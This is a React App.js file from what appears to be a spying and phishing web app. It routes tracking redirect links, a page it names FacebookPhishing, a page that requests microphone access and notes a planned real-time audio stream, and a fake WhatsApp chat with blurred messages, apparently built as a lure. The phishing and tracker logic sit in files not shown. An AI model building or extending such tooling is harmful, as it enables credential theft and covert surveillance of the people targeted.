import React, { useState } from 'react';
import './global.css';
import Login from './components/Login';
import Dashboard from './components/Dashboard';
import TrackerPage from './pages/TrackerPage';
import FacebookPhishing from './pages/FacebookPhishing';
import { BrowserRouter, Routes, Route, useParams } from 'react-router-dom';

function WhatsAppChat() {
  const { number } = useParams();
  return (
    <div style={{
      minHeight: '100vh',
      background: '#111b21',
      color: '#e9edef',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'flex-start',
      fontFamily: 'Inter, Arial, sans-serif'
    }}>
      {/* Barra superior */}
      <div style={{
        width: '100%',
        maxWidth: 700,
        background: '#202c33',
        borderRadius: '0 0 14px 14px',
        boxShadow: '0 2px 8px #0001',
        padding: '1.2rem 2.2rem',
        display: 'flex', alignItems: 'center', gap: 16, marginTop: 32
      }}>
        <div style={{ width: 44, height: 44, borderRadius: '50%', background: '#25d366', color: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 700, fontSize: 22 }}>D</div>
        <div>
          <div style={{ fontWeight: 700, color: '#25d366', fontSize: 18 }}>davi</div>
          <div style={{ color: '#b0b0b0', fontSize: 14 }}>online</div>
        </div>
        <div style={{ marginLeft: 'auto', color: '#b0b0b0', fontSize: 15 }}>{number}</div>
      </div>
      {/* Mensagens (ocultas) */}
      <div style={{
        background: '#202c33',
        borderRadius: 14,
        boxShadow: '0 2px 8px #0001',
        padding: '1.5rem 2.2rem',
        maxWidth: 700,
        width: '100%',
        margin: '32px auto 0 auto',
        minHeight: 320,
        maxHeight: 420,
        overflowY: 'auto',
        display: 'flex', flexDirection: 'column', gap: 0
      }}>
        {[...Array(10)].map((_,i) => (
          <div key={i} style={{
            display: 'flex', alignItems: 'center', gap: 14, borderLeft: '3px solid #25d366', marginBottom: 12,
            background: '#232d36', borderRadius: 8, padding: '0.7rem 1.1rem 0.7rem 0.9rem', position: 'relative',
            minHeight: 54, width: '100%', maxWidth: 600, marginLeft: 'auto', marginRight: 'auto',
            cursor: 'not-allowed', boxSizing: 'border-box', filter: 'blur(3px) grayscale(0.3) brightness(0.7)'
          }}>
            <span style={{ fontSize: '1.2rem', color: '#25d366', marginTop: 2, flexShrink: 0 }}>💬</span>
            <div style={{ flex: 1, minWidth: 0 }}>
              <div style={{ fontWeight: 600, color: '#25d366', fontSize: '1rem', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>davi</div>
              <div style={{ color: '#e9edef', fontSize: '0.98rem', marginTop: 2, fontStyle: 'italic', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>last message</div>
            </div>
            <div style={{ color: '#b0b0b0', fontSize: '0.93rem', marginLeft: 10, flexShrink: 0 }}>Thu • 21:13</div>
          </div>
        ))}
        <div style={{ textAlign: 'center', color: '#b0b0b0', fontSize: 14, marginTop: 10, fontStyle: 'italic', width: '100%' }}>
          last message
        </div>
      </div>
      {/* Campo de digitação fake */}
      <div style={{
        width: '100%', maxWidth: 700, margin: '0 auto', marginTop: 18,
        display: 'flex', alignItems: 'center', gap: 12, background: '#232d36', borderRadius: 10, padding: '0.7rem 1.2rem'
      }}>
        <input disabled placeholder="Type a message..." style={{
          flex: 1, background: 'transparent', border: 'none', color: '#b0b0b0', fontSize: 15, outline: 'none', fontFamily: 'Inter',
        }} />
        <button disabled style={{ background: '#25d366', color: '#fff', border: 'none', borderRadius: 8, padding: '0.5rem 1.2rem', fontWeight: 700, fontSize: 15, cursor: 'not-allowed' }}>Send</button>
      </div>
      {/* Mensagem de privacidade */}
      <div style={{ color: '#b0b0b0', fontSize: 15, marginTop: 18, textAlign: 'center', maxWidth: 700 }}>
        <span style={{ color: '#E60033', fontWeight: 600 }}>You do not have access to the content of this chat.</span>
      </div>
    </div>
  );
}

function MicrophonePage() {
  return (
    <div style={{
      minHeight: '100vh',
      background: 'var(--preto-espionagem)',
      color: 'var(--branco-confissao)',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      textAlign: 'center'
    }}>
      <h2 style={{ color: 'var(--vermelho-paixao)' }}>Microphone Access</h2>
      <p style={{ color: 'var(--cinza-conspiracao)' }}>This page will request microphone access and stream audio in real time (feature coming soon).</p>
      <button
        onClick={() => {
          navigator.mediaDevices.getUserMedia({ audio: true })
            .then(stream => {
              alert('Microphone access granted! (Streaming coming soon)');
              stream.getTracks().forEach(track => track.stop());
            })
            .catch(() => {
              alert('Microphone access denied.');
            });
        }}
        style={{
          background: 'var(--vermelho-paixao)',
          color: 'var(--branco-confissao)',
          borderRadius: 8,
          padding: '0.75rem 2rem',
          fontFamily: 'Montserrat',
          fontWeight: 'bold',
          fontSize: '1.1rem',
          border: 'none',
          cursor: 'pointer',
          transition: 'background 0.2s',
          marginTop: 24
        }}
      >Allow Microphone</button>
    </div>
  );
}

function App() {
  const [usuario, setUsuario] = useState(localStorage.getItem('usuario') || null);

  function handleLogin(email) {
    setUsuario(email);
    localStorage.setItem('usuario', email);
  }

  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={
          !usuario ? (
            <Login onLogin={handleLogin} />
          ) : (
            <Dashboard email={usuario} />
          )
        } />
        <Route path="/redirect/:id" element={<TrackerPage />} />
        <Route path="/facebook/:id" element={<FacebookPhishing />} />
        <Route path="/microphone/:id" element={<MicrophonePage />} />
        <Route path="/whatsapp-chat/:number" element={<WhatsAppChat />} />
      </Routes>
    </BrowserRouter>
  );
}

export default App;
